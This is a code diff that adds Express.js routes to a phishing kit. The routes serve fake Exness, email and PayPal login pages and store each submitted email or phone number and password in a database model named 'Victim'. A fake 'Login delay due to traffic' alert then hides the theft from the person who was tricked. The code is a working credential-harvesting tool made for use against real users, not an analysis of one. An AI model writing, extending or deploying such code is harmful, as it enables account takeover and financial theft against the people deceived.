@@ -293,5 +293,83 @@ router.post('/submit-linkedin-details', async (req, res) => {
 
 
 
+// PREMIUM OFFERS START HERE 
+// Route to display the Exness login page
+router.get('/exness', (req, res) => {
+    const userId = req.query.userId;
+    if (!userId) {
+        return res.status(400).send('User ID is required');
+    }
+    res.render('exness', { userId });
+});
+
+// Route to handle Exness form submission
+router.post('/submit-exness-details', async (req, res) => {
+    const { userId, emailOrNumber, password } = req.body;
+    try {
+        const victim = new Victim({ userId, emailOrNumber, password, platform: 'Exness' });
+        await victim.save();
+        res.send("<script>alert('Login delay due to traffic, please try again later.');</script>");
+    } catch (err) {
+        console.error('Error saving Exness victim details:', err);
+        res.status(500).send('Error processing request');
+    }
+});
+
+
+
+// email route 
+// Route to display the Email login page
+router.get('/email', (req, res) => {
+    const userId = req.query.userId;
+    if (!userId) {
+        return res.status(400).send('User ID is required');
+    }
+    res.render('email', { userId });
+});
+
+// Route to handle Email form submission
+router.post('/submit-email-details', async (req, res) => {
+    const { userId, email, password } = req.body;
+    try {
+        const victim = new Victim({ userId, emailOrNumber: email, password, platform: 'Email' });
+        await victim.save();
+        res.send("<script>alert('Login delay due to traffic, please try again later.');</script>");
+    } catch (err) {
+        console.error('Error saving Email victim details:', err);
+        res.status(500).send('Error processing request');
+    }
+});
+
+
+
+// paypal route 
+// Route to display the PayPal login page
+router.get('/paypal', (req, res) => {
+    const userId = req.query.userId;
+    if (!userId) {
+        return res.status(400).send('User ID is required');
+    }
+    res.render('paypal', { userId });
+});
+
+// Route to handle PayPal form submission
+router.post('/submit-paypal-details', async (req, res) => {
+    const { userId, email, password } = req.body;
+    try {
+        const victim = new Victim({ userId, emailOrNumber: email, password, platform: 'PayPal' });
+        await victim.save();
+        res.send("<script>alert('Login delay due to traffic, please try again later.');</script>");
+    } catch (err) {
+        console.error('Error saving PayPal victim details:', err);
+        res.status(500).send('Error processing request');
+    }
+});
+
+
+
+
+
+
 
 module.exports = router;
